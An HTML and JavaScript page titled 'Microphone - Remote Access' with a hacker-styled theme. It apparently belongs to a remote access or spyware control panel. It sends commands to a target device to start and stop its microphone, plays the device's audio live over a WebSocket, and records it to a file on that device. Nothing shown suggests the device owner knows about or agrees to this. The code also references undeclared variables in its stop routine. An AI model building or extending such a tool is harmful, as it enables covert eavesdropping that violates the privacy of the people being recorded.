<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Microphone - Remote Access</title>
    <link rel="stylesheet" href="/css/hacker-theme.css">
    <style>
        header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 24px;
            padding: 16px;
            background: var(--bg-panel);
            border: 1px solid var(--border);
            border-radius: 4px;
        }

        header::before {
            display: none;
        }

        .control-panel {
            background: var(--bg-panel);
            border: 1px solid var(--border);
            border-radius: 4px;
            padding: 20px;
            margin-bottom: 16px;
        }

        .control-panel h2 {
            color: var(--accent);
            font-size: 1rem;
            margin-bottom: 12px;
            text-transform: uppercase;
            letter-spacing: 1px;
        }

        .controls {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(180px, 1fr));
            gap: 10px;
            margin-bottom: 12px;
        }

        .status-indicator.active {
            border-color: var(--accent-dim);
            box-shadow: 0 0 20px var(--accent-glow);
        }

        .status-indicator.recording {
            border-color: var(--danger);
            box-shadow: 0 0 20px var(--danger-glow);
            animation: pulse 1.5s ease-in-out infinite;
        }

        @keyframes pulse {

            0%,
            100% {
                opacity: 1;
            }

            50% {
                opacity: 0.7;
            }
        }

        .status-indicator h2 {
            font-size: 1.1rem;
            margin-bottom: 4px;
            color: var(--text-primary);
        }

        .status-indicator p {
            color: var(--text-secondary);
            font-size: 0.85rem;
        }

        .audio-visualizer {
            width: 100%;
            height: 60px;
            background: var(--bg-dark);
            border: 1px solid var(--border);
            border-radius: 4px;
            margin-top: 12px;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 3px;
            color: var(--text-muted);
            font-size: 0.8rem;
            overflow: hidden;
        }

        .audio-visualizer .vis-bar {
            width: 4px;
            background: var(--accent);
            border-radius: 2px;
            animation: visBar 0.8s ease-in-out infinite alternate;
        }

        @keyframes visBar {
            from {
                height: 6px;
                opacity: 0.3;
            }

            to {
                height: 40px;
                opacity: 1;
            }
        }
    </style>
</head>

<body>
    <div class="container">
        <header>
            <h1>Microphone Control</h1>
            <a href="index.html" class="btn btn-secondary">&lt;-- Back</a>
        </header>

        <div class="status-indicator" id="status">
            <h2>&#x26AA; Idle</h2>
            <p>No active microphone session</p>
        </div>

        <div class="control-panel">
            <h2>Live Audio</h2>
            <div class="controls">
                <button class="btn btn-primary" id="btn-start-live">START LIVE LISTEN</button>
                <button class="btn btn-danger" id="btn-stop-live" disabled>STOP LIVE</button>
            </div>
            <div class="audio-visualizer" id="visualizer">Waiting for audio...</div>
        </div>

        <div class="control-panel">
            <h2>Recording</h2>
            <div class="controls">
                <button class="btn btn-primary" id="btn-start-record">START RECORDING</button>
                <button class="btn btn-danger" id="btn-stop-record" disabled>STOP RECORDING</button>
            </div>
            <div class="rec-timer" id="mic-rec-timer" style="display:none; margin-top: 10px;">
                <span class="rec-dot"></span>
                <span id="mic-rec-time">00:00</span>
            </div>
        </div>
    </div>

    <script src="/js/api.js"></script>
    <script>
        const deviceId = new URLSearchParams(window.location.search).get('deviceId');
        let currentState = 'idle';
        let audioContext = null;
        let jitterBuffer = []; // Time-based buffer
        let startTime = null;  // AudioContext clock
        let schedulerInterval = null;
        let ws = null;
        let micRecStart = null;
        let micRecInterval = null;

        function startMicRecTimer() {
            micRecStart = Date.now();
            document.getElementById('mic-rec-timer').style.display = 'inline-flex';
            micRecInterval = setInterval(() => {
                const elapsed = Math.floor((Date.now() - micRecStart) / 1000);
                const m = String(Math.floor(elapsed / 60)).padStart(2, '0');
                const s = String(elapsed % 60).padStart(2, '0');
                document.getElementById('mic-rec-time').textContent = `${m}:${s}`;
            }, 1000);
        }

        function stopMicRecTimer() {
            clearInterval(micRecInterval);
            document.getElementById('mic-rec-timer').style.display = 'none';
            document.getElementById('mic-rec-time').textContent = '00:00';
        }

        // Jitter buffer constants
        const SAMPLE_RATE = 16000;
        const FRAME_MS = 10;
        const TARGET_LATENCY = 120; // ms

        if (!deviceId) {
            window.location.href = 'index.html';
        }

        // Initialize Web Audio API
        function initAudio() {
            if (!audioContext) {
                audioContext = new (window.AudioContext || window.webkitAudioContext)();
                console.log('Audio context initialized');
            }
        }

        // Connect to WebSocket for receiving audio chunks
        function connectWebSocket() {
            const wsUrl = `ws://${window.location.host}`;
            ws = new WebSocket(wsUrl);

            ws.onopen = () => {
                console.log('WebSocket connected for audio streaming');
            };

            ws.onmessage = (event) => {
                try {
                    const data = JSON.parse(event.data);

                    // Handle mic_chunk messages
                    if (data.type === 'mic_chunk' && data.deviceId === deviceId) {
                        playAudioChunk(data.data);
                    }
                } catch (error) {
                    console.error('Error parsing WebSocket message:', error);
                }
            };

            ws.onerror = (error) => {
                console.error('WebSocket error:', error);
            };

            ws.onclose = () => {
                console.log('WebSocket disconnected');
                // Reconnect after 2 seconds if in live mode
                if (currentState === 'live') {
                    setTimeout(connectWebSocket, 2000);
                }
            };
        }        // Convert base64 PCM to Float32Array
        function base64ToFloat32(base64) {
            const binaryString = atob(base64);
            const bytes = new Uint8Array(binaryString.length);
            for (let i = 0; i < binaryString.length; i++) {
                bytes[i] = binaryString.charCodeAt(i);
            }

            const pcm16 = new Int16Array(bytes.buffer);
            const float32 = new Float32Array(pcm16.length);
            for (let i = 0; i < pcm16.length; i++) {
                float32[i] = pcm16[i] / 32768.0;
            }
            return float32;
        }

        // Handle incoming audio frame (timestamped JSON)
        function playAudioChunk(frameJson) {
            try {
                // Parse JSON frame: {"ts": 123456, "pcm": "base64..."}
                const frame = JSON.parse(frameJson);

                // Add to jitter buffer
                jitterBuffer.push(frame);

                // Drop old packets (>300ms old)
                const now = performance.now();
                jitterBuffer = jitterBuffer.filter(p => now - p.ts < 300);

                // Update visualizer
                updateVisualizer(`Receiving audio... (${jitterBuffer.length} buffered)`);
            } catch (error) {
                console.error('Error handling audio frame:', error);
            }
        }

        // Time-based audio scheduler (WebRTC-style)
        function schedulePlayback() {
            if (!audioContext || jitterBuffer.length === 0) return;

            // Initialize start time with target latency
            if (!startTime) {
                startTime = audioContext.currentTime + (TARGET_LATENCY / 1000);
            }

            // Schedule all buffered frames
            while (jitterBuffer.length > 0) {
                const frame = jitterBuffer.shift();
                const pcmFloat32 = base64ToFloat32(frame.pcm);

                // Create audio buffer
                const buffer = audioContext.createBuffer(1, pcmFloat32.length, SAMPLE_RATE);
                buffer.copyToChannel(pcmFloat32, 0);

                // Create and schedule source
                const source = audioContext.createBufferSource();
                source.buffer = buffer;
                source.connect(audioContext.destination);
                source.start(startTime);

                // Advance playback clock
                startTime += FRAME_MS / 1000;
            }
        }

        function updateVisualizer(text) {
            const vis = document.getElementById('visualizer');
            if (currentState === 'live') {
                // Show animated bars
                let bars = '';
                for (let i = 0; i < 20; i++) {
                    bars += `<div class="vis-bar" style="animation-delay:${(i * 0.07).toFixed(2)}s"></div>`;
                }
                vis.innerHTML = bars;
            } else {
                vis.textContent = text;
            }
        }

        function updateStatus(state, message) {
            const statusEl = document.getElementById('status');
            statusEl.className = 'status-indicator';

            if (state === 'live') {
                statusEl.className += ' active';
                statusEl.innerHTML = '<h2>&#x1F7E2; Live Listening</h2><p>' + message + '</p>';
            } else if (state === 'recording') {
                statusEl.className += ' recording';
                statusEl.innerHTML = '<h2>&#x1F534; Recording</h2><p>' + message + '</p>';
            } else {
                statusEl.innerHTML = '<h2>&#x26AA; Idle</h2><p>No active microphone session</p>';
            }

            currentState = state;
        }

        async function startLive() {
            try {
                // Initialize audio context
                initAudio();

                // Resume audio context (required by browsers)
                if (audioContext.state === 'suspended') {
                    await audioContext.resume();
                }

                // Connect WebSocket
                connectWebSocket();

                // Send command to start mic
                await api.sendCommand(deviceId, 'mic_start');

                // Start jitter buffer scheduler
                schedulerInterval = setInterval(schedulePlayback, 20);

                updateStatus('live', 'Audio is being streamed from device');
                updateVisualizer('Waiting for audio...');
                document.getElementById('btn-start-live').disabled = true;
                document.getElementById('btn-stop-live').disabled = false;
                api.showToast('Live listening started', 'success');
            } catch (error) {
                api.showToast('Failed: ' + error.message, 'error');
            }
        }

        async function stopLive() {
            try {
                await api.sendCommand(deviceId, 'mic_stop');

                // Close WebSocket
                if (ws) {
                    ws.close();
                    ws = null;
                }

                // Clear audio queue
                audioQueue = [];
                isPlaying = false;

                updateStatus('idle', '');
                updateVisualizer('Waiting for audio...');
                document.getElementById('btn-start-live').disabled = false;
                document.getElementById('btn-stop-live').disabled = true;
                api.showToast('Live listening stopped', 'success');
            } catch (error) {
                api.showToast('Failed: ' + error.message, 'error');
            }
        }

        async function startRecord() {
            try {
                await api.sendCommand(deviceId, 'mic_record_start');
                updateStatus('recording', 'Audio is being recorded to file');
                document.getElementById('btn-start-record').disabled = true;
                document.getElementById('btn-stop-record').disabled = false;
                startMicRecTimer();
                api.showToast('Recording started', 'success');
            } catch (error) {
                api.showToast('Failed: ' + error.message, 'error');
            }
        }

        async function stopRecord() {
            try {
                const result = await api.sendCommand(deviceId, 'mic_record_stop');
                stopMicRecTimer();
                updateStatus('idle', '');
                document.getElementById('btn-start-record').disabled = false;
                document.getElementById('btn-stop-record').disabled = true;

                if (result.data && result.data.path) {
                    api.showToast('Recording stopped. File: ' + result.data.path, 'success');
                } else {
                    api.showToast('Recording stopped', 'success');
                }
            } catch (error) {
                api.showToast('Failed: ' + error.message, 'error');
            }
        }

        document.getElementById('btn-start-live').addEventListener('click', startLive);
        document.getElementById('btn-stop-live').addEventListener('click', stopLive);
        document.getElementById('btn-start-record').addEventListener('click', startRecord);
        document.getElementById('btn-stop-record').addEventListener('click', stopRecord);
    </script>
</body>

</html>
